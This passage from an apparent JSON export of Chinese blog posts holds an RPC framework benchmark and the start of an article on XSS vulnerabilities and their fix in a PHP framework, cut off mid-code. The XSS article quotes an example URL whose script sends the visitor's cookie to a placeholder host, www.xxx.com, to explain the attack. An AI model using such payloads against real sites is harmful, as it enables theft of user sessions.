class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalbool field12 = <span class=\"hljs-number\">12</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=true];</span>\n\n    optionalbool field17 = <span class=\"hljs-number\">17</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=true];</span>\n\n    optionalbool field13 = <span class=\"hljs-number\">13</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=true];</span>\n\n    optionalbool field14 = <span class=\"hljs-number\">14</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=true];</span>\n\n    optionalint32 field104 = <span class=\"hljs-number\">104</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalint32 field100 = <span class=\"hljs-number\">100</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalint32 field101 = <span class=\"hljs-number\">101</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalstring field102 = <span class=\"hljs-number\">102</span>;\n\n    optionalstring field103 = <span class=\"hljs-number\">103</span>;\n\n    optionalint32 field29 = <span class=\"hljs-number\">29</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalbool field30 = <span class=\"hljs-number\">30</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=false];</span>\n\n    optionalint32 field60 = <span class=\"hljs-number\">60</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=-1];</span>\n\n    optionalint32 field271 = <span class=\"hljs-number\">271</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=-1];</span>\n\n    optionalint32 field272 = <span class=\"hljs-number\">272</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=-1];</span>\n\n    optionalint32 field150 = <span class=\"hljs-number\">150</span>;\n\n    optionalint32 field23 = <span class=\"hljs-number\">23</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalbool field24 = <span class=\"hljs-number\">24</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=false];</span>\n\n    optionalint32 field25 = <span class=\"hljs-number\">25</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalbool field78 = <span class=\"hljs-number\">78</span>;\n\n    optionalint32 field67 = <span class=\"hljs-number\">67</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalint32 field68 = <span class=\"hljs-number\">68</span>;\n\n    optionalint32 field128 = <span class=\"hljs-number\">128</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    optionalstring field129 = <span class=\"hljs-number\">129</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=\"xxxxxxxxxxxxxxxxxxxxx\"];</span>\n\n    optionalint32 field131 = <span class=\"hljs-number\">131</span> [<span class=\"hljs-default\"><span class=\"hljs-keyword\">default</span>=0];</span>\n\n    }</code></pre>\n\n<p>测试的时候会初始化这个数据，序列化后的数据大小为 581 字节。</p>\n\n\n\n<h3 id=\"测试client\">测试client</h3>\n\n<p>测试 client类似apache bench工具， 主要通过<code>-c</code>和<code>-n</code>来控制并发数和测试请求量。</p>\n\n<p><code>-c</code> 指定并发的client,每个client都是独立的，在各自的goroutine或者Thread中运行。 Client采用同步的方式调用服务,也就是前一个服务调用完成后才发出下一个服务调用，因此并发量主要靠client的数量来确定。(当然有些rpc框架，比如rpcx/go std rpc支持异步调用，性能会更高，但是统一起见我们对所有的client都采用了同步调用的方式)</p>\n\n<p><code>-n</code> 只发送服务的总的请求数，由client平分。</p>\n\n<p>client在所有调用完成后统一计算吞吐率和延迟。</p>\n\n\n\n<h3 id=\"测试指标\">测试指标</h3>\n\n<ul>\n<li>吞吐率: 每秒完成的请求量</li>\n<li>平均延迟: 服务发出到收到response所需的时间</li>\n<li>P99延迟：99%的调用的延迟时间</li>\n</ul>\n\n\n\n<h3 id=\"测试环境\">测试环境</h3>\n\n<p>server和client在同一台服务器上，使用loopback网络。</p>\n\n<p>cpu cores为 32, Intel Xeon E5-2630 V3 @2.4GHz</p>\n\n\n\n<h2 id=\"测试结果\">测试结果</h2>\n\n\n\n<h3 id=\"处理时间-0ms\">处理时间 0ms</h3>\n\n<table>\n<thead>\n<tr>\n  <th align=\"center\">吞吐率</th>\n  <th align=\"center\">平均延迟</th>\n  <th align=\"left\">P99</th>\n</tr>\n</thead>\n<tbody><tr>\n  <td align=\"center\"><img src=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p0-throughput.png\" alt=\"\" title=\"\"></td>\n  <td align=\"center\"><img src=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p0-latency.png\" alt=\"\" title=\"\"></td>\n  <td align=\"left\"><img src=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p0-p99.png\" alt=\"\" title=\"\"></td>\n</tr>\n</tbody></table>\n\n\n<p>平均延迟 rpcx和hprose重合。</p>\n\n<p><strong>解读</strong>: 简单而高效的Go标准库的rpc性能优异，因为没有额外的服务治理和插件、过滤器的设置，它本身采用一个简单的<code>header</code> + <code>payload</code>的协议，运行高效。</p>\n\n<p>rpcx表现不错，排名第二，并发量变化时吞吐率基本保持不变。</p>\n\n<p>hprose在并发量低的情况下排名第三，但是在并发量大的情况下和rpcx持平。</p>\n\n<p>其次是Google的grpc，吞吐率基本为Go标准rpc的一半。grpc经过去年下半年的性能优化，已经提升了不少的性能。</p>\n\n<p>再其次是thrift,吞吐率在7万左右。</p>\n\n<p>最后几个基本是dubbo、motan和twirp。</p>\n\n<p>基本上，基于Go的rpc框架吞吐率还是很强大的, 除了twirp。</p>\n\n<p>这里有一个奇怪的现象，在0ms这种case下， Go实现的框架P99延迟很大，但是在10ms/30ms下去很小。我在测试web框架的时候一位外国程序员也指出了一个问题，在业务逻辑中加上了runtime.Gosched()解决了这个问题。我想rpc测试也是这个问题，因为服务实现中没有机会让调度器抢走这个goroutine的执行，导致goroutine排队，并不能均匀地执行goroutine，我会在将来的时候验证这个猜想。</p>\n\n<h3 id=\"处理时间-10ms\">处理时间 10ms</h3>\n\n<p>当处理时间为10ms时， 本测试的理论上的吞吐率 = clients * (1000ms/10ms) = clients * 100. 实际由于服务的调度等原因，肯定是达不到这个吞吐率。</p>\n\n<table>\n<thead>\n<tr>\n  <th align=\"center\">吞吐率</th>\n  <th align=\"center\">平均延迟</th>\n  <th>P99</th>\n</tr>\n</thead>\n<tbody><tr>\n  <td align=\"center\"><img src=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p10-throughput.png\" alt=\"\" title=\"\"></td>\n  <td align=\"center\"><img src=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p10-latency.png\" alt=\"\" title=\"\"></td>\n  <td><img src=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p10-p99.png\" alt=\"\" title=\"\"></td>\n</tr>\n</tbody></table>\n\n\n<p>当业务处理时间为10毫秒的时候，服务器需要花一部分时间在线程/goroutine调度上，对于Go来说，它基于goroutine实现并发，对于Java，它基于线程池。</p>\n\n<p>排名前4位的框架基本未变，go stdrpc、rpcx、hprose从趋势上看，随着并发数的增大，还有提升的空间，但是对于grpc,它基本处于一个平缓的趋势了。</p>\n\n<p>其它几种Java框架已经呈现下降的趋势。</p>\n\n<p>当然，在并发数很小的时候，吞吐率差别还不是很明显，基本请求都在10+ms的时候返回，都接近理论数字。</p>\n\n<p>吞吐率高的rpc框架的延迟反而很低， 这也正说明了吞吐率高的原因。在并发数很大的时候，延迟已经远远大于业务处理时间了。</p>\n\n\n\n<h3 id=\"处理时间-30ms\">处理时间 30ms</h3>\n\n<p>当处理时间为30ms时， 本测试的理论上的吞吐率 = clients * (1000ms/30ms) = clients * 33. 实际由于服务的调度等原因，肯定是达不到这个吞吐率。</p>\n\n<table>\n<thead>\n<tr>\n  <th align=\"center\">吞吐率</th>\n  <th align=\"center\">平均延迟</th>\n  <th>P99</th>\n</tr>\n</thead>\n<tbody><tr>\n  <td align=\"center\"><img src=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p30-throughput.png\" alt=\"\" title=\"\"></td>\n  <td align=\"center\"><img src=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p30-latency.png\" alt=\"\" title=\"\"></td>\n  <td><img src=\"http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p30-p99.png\" alt=\"\" title=\"\"></td>\n</tr>\n</tbody></table>\n\n\n<p>业务处理时间为30ms的时候，排名前4位的还是go stdrpc、rpcx、hprose和grpc。</p>\n\n<p>排名第五的是twirp，它也是用Go开发的。第6位是dubbo，在2000并发的情况下性能还好。</p>\n\n<blockquote>\n  <p>在这个月全食的凌晨终于完成了测试，也欢迎大家提供bench代码和讨论。</p>\n</blockquote>\n\n<p><strong>Updated</strong>: 正好看到另外一位同学做的java的rpc/restful框架的<a href=\"https://mp.weixin.qq.com/s/TTcQJM9s5OhyY7dmpJlcfQ\">benchmark</a>, 可以和本文的对照。</p>",
			"markdowncontent":"本文转载自鸟窝的博客 [流行的rpc框架benchmark 2018新春版](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/)\n\n#  目录 [−]\n\n1. [本文测试的RPC框架](#本文测试的RPC框架)\n2. [测试场景](#测试场景)\n\t1. [模拟业务处理时间](#模拟业务处理时间)\n\t2. [测试数据](#测试数据)\n\t3. [测试client](#测试client)\n\t4. [测试指标](#测试指标)\n\t5. [测试环境](#测试环境)\n3. [测试结果](#测试结果)\n\t1. [处理时间 0ms](#处理时间_0ms)\n\t2. [处理时间 10ms](#处理时间_10ms)\n\t3. [处理时间 30ms](#处理时间_30ms)\n\n随着公司规模的扩大，以及业务量的激增，单体应用逐步演化为服务/微服务的架构模式， 服务之间的调用大多采用rpc的方式调用，或者消息队列的方式进行解耦。几乎每个大厂都会创建自己的rpc框架，或者基于知名的rpc框架进行改造。\n\n目前, rpc框架主要沿着两条路线发展，一个是目标为了跨语言，服务端可以用不同的语言实现，客户端也可以用不同的语言实现，不同的语言实现的客户端和服务器端可以互相调用。很显然，要支持不同的语言，需要基于那种语言实现相同协议的框架，并且协议设计应该也是跨语言的，其中比较典型的是 grpc,基于同一个IDL，可以生成不同语言的代码，并且语言的支持也非常的多。\n\n另一个rpc框架发展的目标是支持服务治理，主要的精力放在服务发现、路由、容错处理等方面，主要围绕一个语言开发，可能也有一些第三方曲折的实现服务的调用和服务的实现，这其中的代表，也是比较早的开源的框架就是阿里巴巴的dubbo。\n\n有些rpc框架协议的涉及一开始就没有考虑的跨语言，其中使用了语言的一些特有的属性，比如Java的ObjectInputStream/ObjectOutputStream, Golang的Gob等，有些在协议的设计上就考虑了通用性， 使用JSON或者Protobuffer作为数据序列化。\n\n有些框架是基于TCP的二进制流的数据传输，有些基于http的request/response模型进行请求，也有基于http2的流式传输，更有一些支持可信赖的UDP进行数据传入，比如quic、kcp等。\n\n有些提供了生态圈的一些框架，比如gateway、agent等，有些restful风格的rpc框架天然支持API gateway进行负载均衡。\n\n有些已经得到了大厂的广泛应用，有的大厂内部得到了大量应用，但目前还没有广泛的推开来。\n\n选择一个rpc框架会基于多方面的考虑： 框架特性、性能、成熟度、技术支持、社区活跃度等多个方面，本文只比较各个流行框架的benchmark，基于几个固定的场景提供benchmark数据支持。\n\n本文所使用的benchmark代码位于: [rpcx-benchmark](https://github.com/rpcx-ecosystem/rpcx-benchmark), 这是我在开发[rpcx](https://github.com/smallnest/rpcx)框架的时候为了检验框架性能而抽取出来的一个项目，也欢迎各框架的作者和爱好者提供相应的框架benchmark代码，或者修正其中的错误。\n\n## 本文测试的RPC框架\n\n- [rpcx](https://github.com/smallnest/rpcx): 基于Go的服务治理的rpc框架、客户端支持跨语言\n- [grpc](https://grpc.io): Google 出品的跨语言rpc框架，很弱的(实验性的)负载均衡, 测试使用的是grpc-go\n- [go std rpc](https://golang.org/pkg/net/rpc/): Go标准库的rpc, 不支持跨语言(jsonrpc支持json rpc 1.0)\n- [thrift](https://thrift.apache.org): 跨语言的rpc框架，facebook贡献\n- [dubbo](https://thrift.apache.org): 国内较早开源的服务治理的Java rpc框架，虽然在阿里巴巴内部竞争中落败于HSF，沉寂了几年，但是在国内得到了广泛的应用，目前dubbo项目又获得了支持，并且dubbo 3.0也开始开发\n- [motan](https://thrift.apache.org): 微博内部使用的rpc框架，底层支持java,生态圈往service mesh发展以支持多语言\n- [hprose](https://github.com/hprose): 国内开发人员开发的一个跨语言的rpc框架，非服务治理但是性能高效\n- [twirp](https://github.com/twitchtv/twirp): twitch.tv刚刚开源的一个restful风格的rpc框架\n- [go-micro](https://github.com/micro/go-micro): Go语言的一个服务治理rpc框架， 在测试中发现性能不太好，所以没有继续测试，相关的测试代码已在github库中\n- [go kit](https://github.com/go-kit/kit): 欢迎提供测试代码\n- [腾讯 Tars](https://github.com/Tencent/Tars):腾讯公司的rpc框架， 欢迎提供c++ benchmark代码\n- [百度 brpc](https://github.com/brpc/brpc): 百度公司的rpc框架， 欢迎提供c++ benchmark代码\n- [spring cloud](http://projects.spring.io/spring-cloud/): 本次没有测试\n\n## 测试场景\n\n### 模拟业务处理时间\n\n测试模拟了三种业务处理的场景(模拟业务处理时间):\n\n- 0ms:   业务很简单，可以快速返回。业务处理主要是将反序列化的对象设置几个字段后返回\n- 10ms:  模拟一般的业务处理，这些业务处理主要是本地操作，比如读取本地的数据库等，处理时间相对较短\n- 30ms:  模拟复杂的业务处理， 这些服务可能需要访问第三方服务，或者远程的数据等，处理时间相对较长\n\n当处理时间为0ms时，我们主要测试的整个框架空转的处理能力，涉及的数据的传输，数据的序列化、服务的调度等等。\n当处理时间为10ms、30ms时，这个时间业务处理时间一般要远远大于数据传输和序列化所需的时间，主要比较在大并发的性能框架的调度、处理能力。\n\n### 测试数据\n\n所有的测试都是基于相同的数据, 为了公平起见，统一采用protobuffer进行序列化和反序列化。\n\n数据格式:\n```    \n    messageBenchmarkMessage{\n    \n    requiredstring field1 = 1;\n    \n    optionalstring field9 = 9;\n    \n    optionalstring field18 = 18;\n    \n    optionalbool field80 = 80 [default=false];\n    \n    optionalbool field81 = 81 [default=true];\n    \n    requiredint32 field2 = 2;\n    \n    requiredint32 field3 = 3;\n    \n    optionalint32 field280 = 280;\n    \n    optionalint32 field6 = 6 [default=0];\n    \n    optionalint64 field22 = 22;\n    \n    optionalstring field4 = 4;\n    \n    repeatedfixed64 field5 = 5;\n    \n    optionalbool field59 = 59 [default=false];\n    \n    optionalstring field7 = 7;\n    \n    optionalint32 field16 = 16;\n    \n    optionalint32 field130 = 130 [default=0];\n    \n    optionalbool field12 = 12 [default=true];\n    \n    optionalbool field17 = 17 [default=true];\n    \n    optionalbool field13 = 13 [default=true];\n    \n    optionalbool field14 = 14 [default=true];\n    \n    optionalint32 field104 = 104 [default=0];\n    \n    optionalint32 field100 = 100 [default=0];\n    \n    optionalint32 field101 = 101 [default=0];\n    \n    optionalstring field102 = 102;\n    \n    optionalstring field103 = 103;\n    \n    optionalint32 field29 = 29 [default=0];\n    \n    optionalbool field30 = 30 [default=false];\n    \n    optionalint32 field60 = 60 [default=-1];\n    \n    optionalint32 field271 = 271 [default=-1];\n    \n    optionalint32 field272 = 272 [default=-1];\n    \n    optionalint32 field150 = 150;\n    \n    optionalint32 field23 = 23 [default=0];\n    \n    optionalbool field24 = 24 [default=false];\n    \n    optionalint32 field25 = 25 [default=0];\n    \n    optionalbool field78 = 78;\n    \n    optionalint32 field67 = 67 [default=0];\n    \n    optionalint32 field68 = 68;\n    \n    optionalint32 field128 = 128 [default=0];\n    \n    optionalstring field129 = 129 [default=\"xxxxxxxxxxxxxxxxxxxxx\"];\n    \n    optionalint32 field131 = 131 [default=0];\n    \n    }\n```   \n\n测试的时候会初始化这个数据，序列化后的数据大小为 581 字节。\n\n### 测试client\n\n测试 client类似apache bench工具， 主要通过`-c`和`-n`来控制并发数和测试请求量。\n\n`-c` 指定并发的client,每个client都是独立的，在各自的goroutine或者Thread中运行。 Client采用同步的方式调用服务,也就是前一个服务调用完成后才发出下一个服务调用，因此并发量主要靠client的数量来确定。(当然有些rpc框架，比如rpcx/go std rpc支持异步调用，性能会更高，但是统一起见我们对所有的client都采用了同步调用的方式)\n\n`-n` 只发送服务的总的请求数，由client平分。\n\nclient在所有调用完成后统一计算吞吐率和延迟。\n\n### 测试指标\n\n- 吞吐率: 每秒完成的请求量\n- 平均延迟: 服务发出到收到response所需的时间\n- P99延迟：99%的调用的延迟时间\n\n### 测试环境\n\nserver和client在同一台服务器上，使用loopback网络。\n\ncpu cores为 32, Intel Xeon E5-2630 V3 @2.4GHz\n\n## 测试结果\n\n### 处理时间 0ms\n|吞吐率|平均延迟|P99|\n|:----:|:----:|:----|\n|![](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p0-throughput.png)|![](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p0-latency.png)|![](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p0-p99.png)|\n平均延迟 rpcx和hprose重合。\n\n**解读**: 简单而高效的Go标准库的rpc性能优异，因为没有额外的服务治理和插件、过滤器的设置，它本身采用一个简单的`header` + `payload`的协议，运行高效。\n\nrpcx表现不错，排名第二，并发量变化时吞吐率基本保持不变。\n\nhprose在并发量低的情况下排名第三，但是在并发量大的情况下和rpcx持平。\n\n其次是Google的grpc，吞吐率基本为Go标准rpc的一半。grpc经过去年下半年的性能优化，已经提升了不少的性能。\n\n再其次是thrift,吞吐率在7万左右。\n\n最后几个基本是dubbo、motan和twirp。\n\n基本上，基于Go的rpc框架吞吐率还是很强大的, 除了twirp。\n\n这里有一个奇怪的现象，在0ms这种case下， Go实现的框架P99延迟很大，但是在10ms/30ms下去很小。我在测试web框架的时候一位外国程序员也指出了一个问题，在业务逻辑中加上了runtime.Gosched()解决了这个问题。我想rpc测试也是这个问题，因为服务实现中没有机会让调度器抢走这个goroutine的执行，导致goroutine排队，并不能均匀地执行goroutine，我会在将来的时候验证这个猜想。\n\n### 处理时间 10ms\n\n当处理时间为10ms时， 本测试的理论上的吞吐率 = clients * (1000ms/10ms) = clients \\* 100. 实际由于服务的调度等原因，肯定是达不到这个吞吐率。\n|吞吐率|平均延迟|P99|\n|:----:|:---:|\n|![](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p10-throughput.png)|![](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p10-latency.png)|![](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p10-p99.png)\n当业务处理时间为10毫秒的时候，服务器需要花一部分时间在线程/goroutine调度上，对于Go来说，它基于goroutine实现并发，对于Java，它基于线程池。\n\n排名前4位的框架基本未变，go stdrpc、rpcx、hprose从趋势上看，随着并发数的增大，还有提升的空间，但是对于grpc,它基本处于一个平缓的趋势了。\n\n其它几种Java框架已经呈现下降的趋势。\n\n当然，在并发数很小的时候，吞吐率差别还不是很明显，基本请求都在10+ms的时候返回，都接近理论数字。\n\n吞吐率高的rpc框架的延迟反而很低， 这也正说明了吞吐率高的原因。在并发数很大的时候，延迟已经远远大于业务处理时间了。\n\n### 处理时间 30ms\n\n当处理时间为30ms时， 本测试的理论上的吞吐率 = clients * (1000ms/30ms) = clients \\* 33. 实际由于服务的调度等原因，肯定是达不到这个吞吐率。\n|吞吐率|平均延迟|P99|\n|:---:|:----:|\n|![](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p30-throughput.png)|![](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p30-latency.png)|![](http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p30-p99.png)|\n业务处理时间为30ms的时候，排名前4位的还是go stdrpc、rpcx、hprose和grpc。\n\n排名第五的是twirp，它也是用Go开发的。第6位是dubbo，在2000并发的情况下性能还好。\n\n> 在这个月全食的凌晨终于完成了测试，也欢迎大家提供bench代码和讨论。\n\n**Updated**: 正好看到另外一位同学做的java的rpc/restful框架的[benchmark](https://mp.weixin.qq.com/s/TTcQJM9s5OhyY7dmpJlcfQ), 可以和本文的对照。\n",
			"tags":"性能测试,rpc",
			"id":"79304614",
			"categories":"性能,java",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2018年02月08日 10:10:57",
			"articleedittype":1,
			"private":0,
			"channel":"32",
			"description":"近期公司项目正好被检查出xss漏洞，一直以来其实都知道xss漏洞，不过并没有实际去写过，正好这两天处理了xss漏洞，下面来说一说xss漏洞相关的知识，以及我在项目中如何去解决xss漏洞。\n\n引言: \n\n\n  由于web前端的高速发展，现在的web应用都会使用大量的动态内容和动态交互来提高用户的使用体验，那么，动态内容会根据用户的环境来输出相应的内容。在这个内容上，就会受到“跨站脚本攻击”(Cros...",
			"title":"xss安全漏洞分析以及项目实施解决方案",
			"type":"original",
			"content":"<p>近期公司项目正好被检查出xss漏洞，一直以来其实都知道xss漏洞，不过并没有实际去写过，正好这两天处理了xss漏洞，下面来说一说xss漏洞相关的知识，以及我在项目中如何去解决xss漏洞。</p>\n\n<p>引言: </p>\n\n<blockquote>\n  <p>由于web前端的高速发展，现在的web应用都会使用大量的动态内容和动态交互来提高用户的使用体验，那么，动态内容会根据用户的环境来输出相应的内容。在这个内容上，就会受到“跨站脚本攻击”(Cross Site Scripting，缩写为XSS)的威胁。</p>\n</blockquote>\n\n<h2 id=\"xss是什么\">xss是什么</h2>\n\n<p>xss是一种常见的web安全漏洞，它允许攻击者将恶意代码植入到提供其他用户使用的页面中，不同于大部分攻击，xss涉及到三方，攻击者、客户端与web应用，xss攻击目标是为了盗取存在客户端的cookie或其它网站用户识别客户端身份的敏感信息，一单获取到合法用户信息，攻击者甚至可以假冒合法用户和网站进行交互。</p>\n\n<p>xss分类：</p>\n\n<ul>\n<li>存储型xss，主要让用户输入数据，其他用户浏览查看的地方，例如留言，评论、博客、日志等表单。</li>\n<li>反射型xss，主要将脚本代码加入url地址参数，参数再程序后直接输入，用户点击类似链接可能受到攻击</li>\n</ul>\n\n<p>xss目前的主要手段和目的如下：</p>\n\n<ul>\n<li>盗用cookie，获取敏感信息。</li>\n<li>利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</li>\n<li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击者）用户的身份执行一些管理动作，或执行一些如:发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次XSS。</li>\n<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>\n<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果</li>\n</ul>\n\n\n\n<h2 id=\"xss原理\">xss原理</h2>\n\n<p>Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“&gt;”、“&lt;”)，并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。</p>\n\n<p>接下来以反射性XSS举例说明XSS的过程：现在有一个网站，根据参数输出用户的名称，例如访问url：<code>http://127.0.0.1/?name=astaxie</code>，就会在浏览器输出如下信息：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs \">hello astaxie</code></pre>\n\n<p>如果我们传递这样的url：<code>http://127.0.0.1/?name=&amp;#60;script&amp;#62;alert(&amp;#39;astaxie,xss&amp;#39;)&amp;#60;/script&amp;#62;</code>,这时你就会发现浏览器跳出一个弹出框，这说明站点已经存在了XSS漏洞。那么恶意用户是如何盗取Cookie的呢？与上类似，如下这样的url：<code>http://127.0.0.1/?name=&amp;#60;script&amp;#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&amp;#60;/script&amp;#62;</code>，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。你也许会说，这样的URL一看就有问题，怎么会有人点击？，是的，这类的URL会让人怀疑，但如果使用短网址服务将之缩短，你还看得出来么？攻击者将缩短过后的url通过某些途径传播开来，不明真相的用户一旦点击了这样的url，相应cookie数据就会被发送事先设定好的站点，这样子就盗得了用户的cookie信息，然后就可以利用Websleuth之类的工具来检查是否能盗取那个用户的账户。更多xss分析可看《<a href=\"http://www.rising.com.cn/newsletter/news/2011-08-18/9621.html\">新浪微博XSS事件分析</a>》</p>\n\n\n\n<h2 id=\"广告彩铃平台的xss漏洞\">广告彩铃平台的xss漏洞</h2>\n\n<p>在我们的admin系统中，由于使用的spring.php框架过于陈旧，没有使用xss过滤，所以在系统多处均有xss漏洞，而在dsp系统中，spring.php框架提供了xss过滤功能，但是在使用中发现由于场景的需要，有些页面可能需要传递json，不能使用xss过滤，需要将其转换为php数组再将其属性进行xss过滤，但是这部分工作由于开发人员的疏忽，导致xss漏洞的存在，通过绿盟的扫描，我们及时对这种漏洞进行修复。</p>\n\n\n\n<h3 id=\"11-修复思路\">1.1 修复思路</h3>\n\n<p>根据xss的分类，我们实际可以知晓我们应当在用户输入至后台和前端网站输出内容两处做防护即可，那么在广告平台中，我们在用户输入出进行防护。ok，进入防护主题：</p>\n\n<p>​   首先我们需要一个在统一拦截器里面对参数进行xss过滤，在<code>spring.php</code> （公司自研发的php框架）框架中使用Request来统一获取由前端进行的web请求传递的参数值，通过对参数值的解析过滤，达到xss的效果，但是我们实际业务在获取参数的时候可能需要不过滤的内容（例如传递<code>json</code>），那么这个时候，我们需要设计两种方案，实现拿到<strong>安全的参数</strong>或不过滤的参数。</p>\n\n\n\n<h3 id=\"12-修复开始\">1.2 修复开始</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-php hljs \"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Request</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">SingletonBase</span>\n{</span>\n    <span class=\"hljs-comment\">/**\n     * 包含所有get请求字段的数组\n     */</span>\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable\">$get</span> = <span class=\"hljs-keyword\">Array</span>();\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable\">$raw_get</span> = <span class=\"hljs-keyword\">Array</span>();\n\n    <span class=\"hljs-comment\">/**\n     * 包含所有post请求字段的数组\n     */</span>\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable\">$post</span> = <span class=\"hljs-keyword\">Array</span>();\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable\">$raw_post</span> = <span class=\"hljs-keyword\">Array</span>();\n\n    <span class=\"hljs-comment\">/**\n     * 包含所有请求字段的数组\n     */</span>\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable\">$request</span> = <span class=\"hljs-keyword\">Array</span>();\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable\">$raw_request</span> = <span class=\"hljs-keyword\">Array</span>();\n\n    <span class=\"hljs-comment\">/**\n     * 客户端访问的ip地址\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable\">$client_ip</span> = <span class=\"hljs-string\">''</span>;\n\n    <span class=\"hljs-comment\">/**\n     * 上一次访问地址\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable\">$referer</span> = <span class=\"hljs-string\">''</span>;\n\n    <span class=\"hljs-comment\">/**\n     * 当前访问地址\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable\">$url</span> = <span class=\"hljs-string\">''</span>;\n\n    <span class=\"hljs-comment\">/**\n     * 获取请求参数\n     *<span class=\"hljs-phpdoc\"> @param</span> string $name 请求参数名称\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">params</span><span class=\"hljs-params\">(<span class=\"hljs-variable\">$name</span> = <span class=\"hljs-string\">''</span>)</span>\n    {</span>\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$name</span> == <span class=\"hljs-string\">''</span>)\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$request</span>;\n        <span class=\"hljs-variable\">$param</span> = <span class=\"hljs-keyword\">self</span>::<span class=\"hljs-variable\">$request</span>[<span class=\"hljs-variable\">$name</span>];\n        <span class=\"hljs-keyword\">if</span>(is_string(<span class=\"hljs-variable\">$param</span>)){\n            <span class=\"hljs-keyword\">return</span> trim(<span class=\"hljs-variable\">$param</span>);\n        }\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$param</span>;\n    }\n\n    <span class=\"hljs-comment\">/**\n     * 获取表单请求参数\n     *<span class=\"hljs-phpdoc\"> @param</span> string $name 请求参数名称\n     */</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">form</span><span class=\"hljs-params\">(<span 